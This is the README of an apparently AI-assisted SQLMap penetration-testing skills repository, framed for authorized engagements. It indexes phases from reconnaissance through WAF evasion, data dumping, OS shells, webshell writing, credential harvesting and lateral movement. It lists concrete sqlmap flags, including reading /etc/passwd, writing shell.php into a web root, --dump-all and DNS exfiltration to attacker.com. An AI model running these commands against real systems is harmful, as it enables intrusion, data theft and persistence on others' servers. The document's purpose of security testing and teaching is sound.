# IA.SQAMAP

> **AI-Assisted SQLMap Penetration Testing Skills Repository**
>
> A professional-grade knowledge base encoding deep SQLMap expertise into reusable skills, configuration profiles, and automated utilities for authorized penetration testing engagements.

---

## Legal Notice

**ALL activities must be authorized.** Only use these techniques against systems you own or have explicit written permission to test. Unauthorized use is illegal and unethical. This repository is for authorized security professionals only.

---

## Quick Start

```bash
# 1. Clone and setup
git clone <repo-url> IA.SQAMAP
cd IA.SQAMAP
pip install -r requirements.txt

# 2. Build a command using the command builder
python utils/command_builder.py --target "http://target.com/page.php?id=1" --mode quick

# 3. Select tampers for a specific WAF
python utils/tamper_selector.py --waf cloudflare --dbms mysql

# 4. Follow the master methodology
cat METHODOLOGY.md
```

---

## Repository Structure

```
IA.SQAMAP/
├── README.md               # This file
├── METHODOLOGY.md          # Master decision tree - start here
│
├── skills/                 # Skill files organized by pentest phase
│   ├── 00_reconnaissance/  # Recon: parameter discovery, WAF/DBMS detection
│   ├── 01_detection/       # SQL injection technique detection skills
│   ├── 02_waf_evasion/     # WAF bypass strategies and tamper selection
│   ├── 03_exploitation/    # Database enumeration, data extraction, shell access
│   └── 04_post_exploitation/ # Credential harvesting, lateral movement, cleanup
│
├── configs/                # Ready-to-use sqlmap .cfg profiles
├── tamper/                 # Tamper script analysis, WAF matrices, custom scripts
├── utils/                  # Python automation utilities
└── docs/                   # DB cheatsheets, legal templates
```

---

## Skills Index

### Phase 0: Reconnaissance
| Skill | Description |
|-------|-------------|
| [Parameter Discovery](skills/00_reconnaissance/parameter_discovery.md) | Identify injectable parameters before testing |
| [WAF Detection](skills/00_reconnaissance/waf_detection.md) | Fingerprint web application firewalls |
| [DBMS Fingerprinting](skills/00_reconnaissance/dbms_fingerprinting.md) | Identify backend database without full injection |

### Phase 1: Detection (Technique Selection)
| Skill | Technique | When to Use |
|-------|-----------|-------------|
| [Quick Scan](skills/01_detection/quick_scan.md) | All | First-pass detection |
| [Boolean-Based Blind](skills/01_detection/boolean_blind.md) | B | Different HTTP responses for true/false |
| [Time-Based Blind](skills/01_detection/time_blind.md) | T | No visible response difference |
| [Error-Based](skills/01_detection/error_based.md) | E | App shows DB error messages |
| [UNION-Based](skills/01_detection/union_based.md) | U | App displays query results directly |
| [Stacked Queries](skills/01_detection/stacked_queries.md) | S | App supports multi-statement execution |
| [OOB / DNS Exfiltration](skills/01_detection/oob_dns.md) | Q | DNS server control, 30x faster than time-based |

### Phase 2: WAF Evasion
| Skill | Description |
|-------|-------------|
| [WAF Identification](skills/02_waf_evasion/waf_identification.md) | Fingerprint WAF from response patterns |
| [Tamper Selection Guide](skills/02_waf_evasion/tamper_selection_guide.md) | Choose optimal tamper scripts |
| [Tamper Chaining](skills/02_waf_evasion/tamper_chaining.md) | Combine tampers for complex WAFs |
| [Encoding Strategies](skills/02_waf_evasion/encoding_strategies.md) | Payload encoding and obfuscation |

### Phase 3: Exploitation
| Skill | Description |
|-------|-------------|
| [Database Enumeration](skills/03_exploitation/database_enumeration.md) | List databases, tables, columns |
| [Data Extraction](skills/03_exploitation/data_extraction.md) | Dump table contents efficiently |
| [OS Shell](skills/03_exploitation/os_shell.md) | Interactive OS command execution |
| [File Read](skills/03_exploitation/file_read.md) | Read files from the database server |
| [File Write](skills/03_exploitation/file_write.md) | Write webshells or files |
| [UDF Injection](skills/03_exploitation/udf_injection.md) | Inject custom DB functions |
| [Privilege Escalation](skills/03_exploitation/privilege_escalation.md) | Escalate DB/OS privileges |

### Phase 4: Post-Exploitation
| Skill | Description |
|-------|-------------|
| [Credential Harvesting](skills/04_post_exploitation/credential_harvesting.md) | Extract and crack DB credentials |
| [Lateral Movement](skills/04_post_exploitation/lateral_movement.md) | Move from DB to other systems |
| [Cleanup & Evidence](skills/04_post_exploitation/cleanup_and_evidence.md) | Preserve evidence, remove artifacts |

---

## Configuration Profiles

Ready-to-use sqlmap profiles for common scenarios:

| Profile | Use Case |
|---------|----------|
| `configs/quick_scan.cfg` | Fast first-pass, minimal requests |
| `configs/deep_scan.cfg` | Thorough coverage, all techniques |
| `configs/stealth_scan.cfg` | Low-and-slow, detection evasion |
| `configs/aggressive_scan.cfg` | Maximum speed, high noise |
| `configs/waf_cloudflare.cfg` | Optimized for Cloudflare WAF |
| `configs/waf_modsecurity.cfg` | Optimized for ModSecurity |
| `configs/waf_imperva.cfg` | Optimized for Imperva |
| `configs/db_mysql.cfg` | MySQL-optimized settings |
| `configs/db_mssql.cfg` | MSSQL-optimized settings |
| `configs/db_postgresql.cfg` | PostgreSQL-optimized settings |
| `configs/db_oracle.cfg` | Oracle-optimized settings |

Usage:
```bash
sqlmap -u "http://target.com/page.php?id=1" --config=configs/quick_scan.cfg
```

---

## Python Utilities

| Module | Purpose |
|--------|---------|
| `utils/command_builder.py` | Generate optimal sqlmap commands interactively |
| `utils/tamper_selector.py` | Auto-select tampers based on WAF type |
| `utils/technique_advisor.py` | Recommend injection technique from response behavior |
| `utils/waf_detector.py` | Fingerprint WAF from HTTP response headers/body |
| `utils/output_parser.py` | Parse sqlmap output into structured findings |

---

## The 6 SQL Injection Techniques

| Code | Name | Speed | Requirements |
|------|------|-------|--------------|
| **U** | UNION-based | Fastest | App displays query results |
| **E** | Error-based | Fast | App shows DB error messages |
| **B** | Boolean-based blind | Medium | Different responses for true/false |
| **Q** | Out-of-band (DNS) | Fast* | DNS server control needed |
| **S** | Stacked queries | Varies | Multi-statement support |
| **T** | Time-based blind | Slowest | Works anywhere, last resort |

*OOB is ~30x faster than time-based when DNS control is available.

---

## Key SQLMap Flags Reference

### Target
```bash
-u "URL"                          # URL with parameter
-r request.txt                    # HTTP request from Burp file
-d "mysql://user:pass@host/db"    # Direct DB connection
--data "POST body"                # POST data
--cookie "session=abc"            # Session cookies
```

### Optimization (use these to speed up)
```bash
--dbms=mysql                      # Specify DBMS (huge speedup)
--technique=B                     # Limit techniques
--level=1 --risk=1               # Conservative (default)
--threads=10                      # Parallel requests
--batch                           # Non-interactive (use defaults)
```

### Detection Control
```bash
--level 1-5                       # 1=GET/POST only, 5=all headers/cookies
--risk 1-3                        # 1=safe, 3=dangerous payloads
-p param_name                     # Test specific parameter only
```

### WAF Evasion
```bash
--tamper=space2comment,randomcase  # Tamper scripts (chain with comma)
--random-agent                    # Random User-Agent
--delay=2                         # Delay between requests
--proxy=http://127.0.0.1:8080    # Burp Suite integration
```

### Exploitation
```bash
--dbs                             # List databases
--tables -D dbname                # List tables
--dump -D dbname -T tablename    # Dump table
--dump-all                        # Dump everything
--os-shell                        # Interactive OS shell
--file-read=/etc/passwd          # Read file
--file-write=shell.php --file-dest=/var/www/html/  # Write file
--dns-domain=attacker.com        # OOB DNS exfiltration
```

---

## Tamper Scripts Quick Reference

| Tamper | Bypasses | Notes |
|--------|----------|-------|
| `space2comment` | Space filters | Replaces spaces with `/**/` |
| `randomcase` | Keyword filters | `SELECT` -> `SeLeCt` |
| `charencode` | URL filters | URL-encodes payload |
| `base64encode` | Pattern matching | Base64 encodes entire payload |
| `between` | Operator filters | Replaces `>` with `NOT BETWEEN` |
| `apostrophemask` | Quote filters | Replaces `'` with UTF-8 full-width |
| `htmlencode` | HTML entity filters | Encodes special chars as HTML entities |
| `greatest` | Comparison filters | Replaces `>` with `GREATEST()` |
| `ifnull2ifisnull` | Null handling | MySQL-specific null bypass |
| `modsecurityzeroversioned` | ModSecurity | Zero-version comment bypass |

See [WAF Tamper Matrix](tamper/WAF_TAMPER_MATRIX.md) for comprehensive mapping.

---

## Workflow Overview

```
START
  |
  v
[RECON] Discover parameters -> detect WAF -> fingerprint DBMS
  |
  v
[DETECT] Quick scan -> identify working technique (B/T/E/U/S/Q)
  |
  +-- WAF blocking? -> [WAF EVASION] Select + chain tampers
  |
  v
[EXPLOIT] Enumerate DB -> extract data -> escalate access
  |
  +-- File system access? -> file read/write/webshell
  +-- OS access? -> --os-shell
  +-- High privilege? -> UDF injection / priv-esc
  |
  v
[POST-EXPLOIT] Harvest creds -> lateral movement -> cleanup
```

See [METHODOLOGY.md](METHODOLOGY.md) for the full decision tree.

---

## Resources

- [SQLMap Official](https://sqlmap.org/)
- [SQLMap GitHub](https://github.com/sqlmapproject/sqlmap)
- [SQLMap Wiki - Techniques](https://github.com/sqlmapproject/sqlmap/wiki/Techniques)
- [SQLMap Tamper Scripts](https://github.com/sqlmapproject/sqlmap/tree/master/tamper)
- [PayloadsAllTheThings - SQL Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
